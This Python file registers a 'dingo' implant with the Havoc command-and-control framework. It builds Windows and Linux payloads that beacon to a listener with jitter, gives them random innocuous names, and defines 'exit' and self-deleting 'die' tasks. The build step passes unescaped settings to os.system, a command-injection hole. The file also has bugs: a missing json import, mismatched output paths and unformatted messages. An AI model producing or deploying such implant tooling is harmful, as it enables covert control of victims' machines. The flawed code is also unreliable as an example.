from havoc.service import HavocService
from havoc.agent import *
import os
import secrets

# FOR NAME GENERATION
nouns = ["course", "system", "school", "family", "market", "police", "policy", "office", "person", "health", "mother", "period", "father", "centre", "effect", "action", "moment", "report", "church", "change", "street", "result", "reason", "nature", "member", "figure", "friend", "amount", "series", "future", "labour", "letter", "theory", "growth", "chance", "record", "energy", "income", "scheme", "design", "choice", "couple", "county", "summer", "colour", "season", "garden", "charge", "advice", "doctor", "extent", "window", "access", "region", "degree", "return", "public", "answer", "leader", "appeal", "method", "source", "oxford", "demand", "sector", "status", "safety", "weight", "league", "budget", "review", "minute", "survey", "speech", "effort", "career", "attack", "length", "memory", "impact", "forest", "sister", "winter", "corner", "damage", "credit", "debate", "supply", "museum", "animal", "island", "relief", "target", "spirit", "coffee", "factor", "battle", "prison", "bridge", "detail", "client", "search", "master", "dinner", "agency", "manner", "favour", "crisis", "prince", "danger", "output", "middle", "player", "threat", "notice", "bottom", "profit", "second", "castle", "option", "reform", "spring", "estate", "volume", "martin", "branch", "object", "driver", "belief", "murder", "flight", "treaty", "desire", "palace", "engine", "breath", "screen", "silver", "injury", "valley", "bishop", "christ", "motion", "author", "nation", "sample", "aspect", "cancer", "beauty", "square", "vision", "reader", "behalf", "deputy", "artist", "graham", "expert", "parish", "strike", "border", "bottle", "autumn", "victim", "editor", "stress", "wealth", "parent", "decade", "height", "writer", "taylor", "clause", "worker", "empire", "notion", "mirror", "travel", "regime", "circle", "pocket", "module", "affair", "winner", "breach", "finger", "throat", "phrase", "holder", "canada", "defeat", "joseph", "origin", "shadow", "device", "tennis", "jacket", "column", "guitar", "signal", "poetry", "camera", "maggie", "string", "tenant", "burden", "cattle", "studio", "cheese", "summit", "carbon", "stream", "berlin", "medium", "ulster", "cotton", "heaven", "farmer", "tongue", "petrol", "walker", "timber", "oliver", "tunnel", "lesson", "norman", "carpet", "humour", "lawyer", "miller", "strain", "honour", "turkey", "flower", "glance", "ticket", "secret", "fabric", "format", "female", "chapel", "butter", "talent", "prayer", "export", "tissue", "temple", "dollar", "priest", "horror", "wright", "equity", "garage", "salary", "warmth", "gender", "cheque", "harris", "weapon", "seller", "cinema", "oxygen", "launch", "escape", "resort", "virtue", "morgan", "wonder", "fellow", "desert", "morris", "planet", "copper", "symbol", "excess", "dealer", "muscle", "singer", "stance", "cousin", "spread", "regard", "brazil", "infant", "domain", "switch", "rescue", "whisky", "surrey", "excuse", "reward", "breast", "pardon", "arrest", "button", "avenue", "finish", "johnny", "wisdom", "virgin", "german", "daniel", "toilet", "newton", "bronze", "repair", "filter", "rhythm", "vendor", "margin", "custom", "jordan", "shower", "matrix", "clinic", "bureau", "terror", "salmon", "comedy", "vessel", "merger", "supper", "killer", "coffin", "lounge", "keeper", "clergy", "server", "accent", "collar", "butler", "soccer", "breeze", "remedy", "carter", "trophy", "senate", "hunter", "marble", "diesel", "stroke", "orange", "ladder", "powder", "basket", "willie", "thesis", "layout", "ballet", "misery", "script", "needle", "murray", "legend", "sphere", "liquid", "gravel", "throne", "cooper", "remark", "fusion", "turner", "entity", "parker", "handle", "intake", "praise", "manual", "intent", "inside", "packet", "temper", "porter", "darwin", "pencil", "colony", "critic", "claire", "victor", "canvas", "hunger", "racism", "jersey", "knight", "sophie", "steven", "gospel", "legacy", "genius", "double", "bailey", "mucosa", "census", "parade", "accord", "nelson", "hatred", "shield", "motive", "outset", "recipe", "madame", "plasma", "bucket", "hammer", "quarry", "ballot", "murphy", "franco", "morale", "pepper", "sheila", "patent", "import", "tumour", "fringe", "chorus", "heroin", "jungle", "asylum", "vacuum", "sleeve", "unrest", "refuge", "ritual", "sodium", "fridge", "burial", "fossil", "debtor", "strand", "drawer", "armour", "statue", "common", "patten", "warren", "dragon", "cherry", "velvet", "potato", "luxury", "thrust", "barrel", "brandy", "kettle", "travis", "palmer", "fisher", "elaine", "gossip", "burton", "outfit", "combat", "joanna", "biopsy", "advent", "decree", "poison", "thread", "garlic", "hazard", "candle", "sewage", "foster", "cruise", "little", "patron", "hamlet", "corpse", "jockey", "debris", "patrol", "ernest", "insect", "dexter", "enzyme", "mosaic", "denial", "poster", "tomato", "purity", "corpus", "revolt", "circus", "header", "stitch", "nephew", "plight", "parcel", "lawson", "guinea", "waiter", "warden", "demise", "boiler", "soviet", "bullet", "single", "oracle", "runner", "voyage", "gentry", "tariff", "litter", "saddle", "vector", "marker", "helmet", "excise", "spider", "meadow", "pillow", "bowler", "gloria", "tenure", "famine", "bundle", "warsaw", "stella", "radius", "rumour", "asthma", "cellar", "auntie", "ribbon", "defect", "melody", "regret", "cannon", "spouse", "mickey", "henley", "climax", "campus", "recall", "herald", "rocket", "galaxy", "picnic", "torque", "baxter", "hockey", "granny", "socket", "sierra", "bomber", "cement", "potter", "kidney", "sketch", "brooke", "ordeal", "barley", "coupon", "syntax", "divide", "dancer", "outlet", "regent", "clough", "sherry", "pistol", "wallet", "trader", "banker", "stereo", "violin", "tackle", "fender", "wicket", "convoy", "escort", "mantle", "monkey", "bypass", "michel", "buffet", "banner", "update", "sunset", "sorrow", "mister", "legion", "hurdle", "saloon", "squash", "talbot", "trench", "vigour", "hostel", "mortar", "rubber", "dismay", "heater", "cooker", "banana", "trauma", "mutant", "jumper", "hector", "barton", "warner", "winger", "jargon", "shrine", "outing", "donkey", "center", "puzzle", "midday", "runway", "jaguar", "pledge", "harper", "scream", "plague", "embryo", "rector", "canopy", "anchor", "pastry", "bubble", "savage", "upside", "groove", "menace", "insult", "vapour", "barrow", "ascent", "reflux", "serial", "blouse", "repeat", "rental", "cereal", "stride", "slogan", "suburb", "replay", "sultan", "pillar", "caesar", "viewer", "grange", "viking", "roller", "marina", "sailor", "plaque", "homage", "advert", "glider", "novice", "jasper", "gamble", "liquor", "priory", "barber", "goblin", "sponge", "fowler", "tactic", "polish", "slater", "barker", "cuckoo", "bidder", "exodus", "cavity", "streak", "thrill", "weaver", "unease", "lender", "clutch", "tallis", "storey", "bugger", "pigeon", "scorer", "fright", "bonnet", "influx", "currie", "phoebe", "hollow", "freeze", "yellow", "sudden", "fulham", "hooker", "sermon", "misuse", "tarmac", "tanker", "parity", "racket", "esteem", "cassie", "hearth", "violet", "carrot", "gutter", "parrot", "barnet", "assent", "matron", "tavern", "spiral", "cortex", "vanity", "rubble", "stroud", "golfer", "creole", "cohort", "amazon", "uptake", "splash", "portal", "gallon", "ridley", "caller", "walnut", "upland", "finale", "tablet", "cradle", "covent", "arcade", "hopper", "grease", "willow", "cursor", "jumble", "dinghy", "cutter", "pickup", "pollen", "badger", "wizard", "folder", "expiry", "thorpe", "stable", "coward", "almond", "apollo", "gummer", "squire", "brewer", "sheikh", "artery", "archie", "enamel", "cowboy", "faeces", "malice", "magnet", "trough", "settee", "barney", "scotch", "lionel", "garvey", "uplift", "marrow", "argyll", "tiller", "karate", "beacon", "anthem", "saucer", "plough", "bunker", "crunch", "raffle", "incest", "mobile", "riddle", "ferret", "staple", "digest", "mosque", "sexism", "median", "ledger", "helper", "umpire", "piazza", "unison", "ginger", "puppet", "murmur", "tucker", "tailor", "fungus", "myriad", "manure", "cobalt", "barman", "opener", "becker", "livery", "lesion", "tandem", "thirst", "rarity", "dobson", "stroll", "ransom", "millie", "thrush", "retina", "bamboo", "mammal", "craven", "dalton", "connie", "seaman", "jigsaw", "frenzy", "hassle", "bakery", "cartel", "crater", "nausea", "alaska", "falcon", "dagger", "plunge", "flurry", "harrow", "strife", "apathy", "schema", "gunman", "outcry", "sprint", "papacy", "deacon", "rudder", "daphne", "refuse", "vagina", "trifle", "tangle", "martyr", "alkali", "pulpit", "stigma", "pirate", "bumper", "burrow", "jessie", "witney", "beetle", "hooper", "hoover", "sequel", "mentor", "stench", "turtle", "parody", "feeder", "condom", "canyon", "volley", "facade", "remand", "sanity", "parson", "subset", "maiden", "quartz", "orient", "bryony", "curate", "locker", "fiasco", "curfew", "tundra", "bleach", "sonata", "galley", "bearer", "heyday", "spence", "manila", "teapot", "upturn", "psyche", "ration", "hearer", "caddie", "rattle", "canary", "outlay", "zenith", "pastor", "primer", "refund", "yogurt", "saliva", "rapist", "salute", "parole", "botany", "bridle", "sender", "kitten", "maggot", "mercer", "safari", "permit", "enigma", "pellet", "octave", "kinase", "spruce", "shrimp", "uproar", "nether", "hangar", "recess", "picket", "beggar", "mousse", "helium", "dieter", "parkin", "hybrid", "ghetto", "casino", "claret", "heresy", "bother", "bazaar", "oyster", "ambush", "foetus", "clover", "affect", "utopia", "fodder", "orchid", "tender", "ripple", "burger", "rigour", "draper", "prompt", "lizard", "backup", "sensor", "wicker", "occult", "relish", "closet", "binder", "bertha", "tensor", "shaikh", "ribber", "muddle", "slough", "surety", "mutiny", "kernel", "fiddle", "sonnet", "reggae", "repeal", "carver", "proton", "reflex", "louvre", "amelia", "tycoon", "laurel", "insert", "fleece", "rebate", "hernia", "lagoon", "trance", "tremor", "grouse", "tardis", "glover", "satire", "resale", "collor", "lotion", "genome", "airbus", "celery", "penis", "dwarf", "nuts", "balls", "burger"]
adjs = ["precious", "utter", "admirable", "sweltering", "afraid", "spiffy", "sunny", "decisive", "square", "pristine", "impractical", "elliptical", "buttery", "unselfish", "jubilant", "jealous", "bowed", "harmful", "somber", "livid", "ideal", "lucky", "trifling", "subtle", "pretty", "indelible", "disfigured", "nautical", "closed", "rosy", "gargantuan", "polite", "full", "arctic", "mortified", "fussy", "jumpy", "bountiful", "lazy", "small", "big", "defenseless", "ample", "nutty", "live", "charming", "obedient", "subdued", "stale", "reckless", "gummy", "shabby", "exotic", "true", "courageous", "worldly", "massive", "thoughtful", "daring", "decent", "physical", "neglected", "showy", "corny", "wealthy", "electric", "hairy", "circular", "blissful", "unused", "gleeful", "unlucky", "studious", "spotted", "plump", "bruised", "thorny", "infamous", "greedy", "zigzag", "busy", "virtuous", "dramatic", "grimy", "misguided", "appropriate", "ugly", "shady", "ruddy", "taut", "frail", "costly", "kooky", "tan", "stimulating", "knotty"]

# ==============
# == Commands ==
# ==============
class CommandExit(Command):
    Name = "exit"
    Description = "tells agent to exit"
    Help = "leave the shell"
    NeedAdmin = False
    Mitr = []
    Params = []

    def job_generate(self, arguments: dict) -> bytes:
        packer = Packer()
        data = {"TaskCommand":"exit", "TaskFile":"", "TaskArgument":""}
        packer.add_data(data)
        return packer.buffer

class CommandDie(Command):
    Name = "die"
    Description = "tell agent to quit and delete itself"
    Help = "tell agent to quit and delete itself"
    NeedAdmin = False
    Mitr = []
    Params = []
    
    def job_generate(self, arguments: dict) -> bytes:
        packer = Packer()
        data = {"TaskCommand":"die", "TaskFile":"", "TaskArgument":""}
        packer.add_data(data)
        return packer.buffer

# =================
# == Agent Class ==
# =================
class dingo(AgentType):
    Name = "dingo"
    Author = "Deranged0tter"
    Version = "0.1"
    Description = f"""3rd party agent for HavocC2"""
    MagicValue = 0x64696E67

    Arch = [
        "x64",
        "x86",
    ]

    Formats = [
        {
            "Name": "Windows Executable (exe)",
            "Extension": "exe",
        },
        {
            "Name": "Windows Dynamic Library (dll)",
            "Extension": "dll",
        },
        {
            "Name": "Linux Binary (elf)",
            "Extension": "",
        },
    ]

    BuildingConfig = {
        "Sleep": "10",
        "Jitter": "5",
    }

    Commands = [
        CommandExit(),
    ]

    def generate(self, config: dict) -> None:
        clientID = config['ClientID']
        sleep = config['Config']['Sleep']
        jitter = config['Config']['Jitter']
        format = config['Options']['Format']
        arch = config['Options']['Arch']
        host = config['Options']['Listener']['Hosts'][0]
        port = config['Options']['Listener']['PortBind']
        uris = config['Options']['Listener']['Uris'][0]
        userAgent = config['Options']['Listener']['UserAgent']
        
        # generate name for agent
        name = secrets.choice(adjs) + "_" + secrets.choice(nouns)
        
        # get goos and goarch from format and arch
        goos = "windows"
        goarch = "amd64"
        isDLL = False
        if format == "Windows Executable (exe)":
            goos = "windows"
            name += ".exe"
        elif format == "Windows Dynamic Library (dll)":
            goos = "windows"
            name += ".dll"
            isDLL = True
        elif format == "Linux Binary (elf)":
            goos = "linux"
            
        if arch == "x64":
            goarch = "amd64"
        elif arch == "x86":
            goarch = "i386"
        
        # build agent
        self.builder_send_message(config[ 'ClientID' ], "Info", f"make -C ./agent/ SLEEP={sleep} JITTER={jitter} RHOST={host} RPORT={port} USERAGENT={userAgent} URI={uris} BIN_NAME={name} cGOOS={goos} cGOARCH={goarch} isDLL={isDLL} OUT_PATH=./bin/")
        os.system(f"make -C ./agent/ SLEEP={sleep} JITTER={jitter} RHOST={host} RPORT={port} USERAGENT=\"{userAgent}\" URI={uris} BIN_NAME={name} cGOOS={goos} cGOARCH={goarch} isDLL={isDLL} OUT_PATH=../bin/")
        
        data = open(f"./bin/{name}", "rb").read()
        
        self.builder_send_message(config[ 'ClientID' ], "Info", f"Successfully built agent {name}")
        self.builder_send_payload(config["ClientID"], name, data)
    
    def response(self, response: dict) -> bytes:
        agentHeader = response["AgentHeader"]
        agentResponse = response["Response"]
        
        print("received response from agent (%s)\n---\nResponse:\n%s", agentHeader, agentResponse)
        
        agentJSONResponse = json.loads(agentResponse)
        if agentJSONResponse["task"] == "register":
            print("[+] Registered Agent")
            self.register(agentHeader, json.loads(agentJSONResponse["data"]))
            
            AgentID = response["AgentHeader"]["AgentID"]
            
            self.console_message(AgentID, "Good", "Dingo Agent {AgentID} successfully registered", "")
            return b'registered'
        

def main():
    Havoc_Dingo = dingo()
    Havoc_Service = HavocService(
        endpoint="wss://localhost:40056/service-endpoint",
        password="service-password"
    )

    Havoc_Service.register_agent(Havoc_Dingo)

    return

if __name__ == "__main__":
    main()
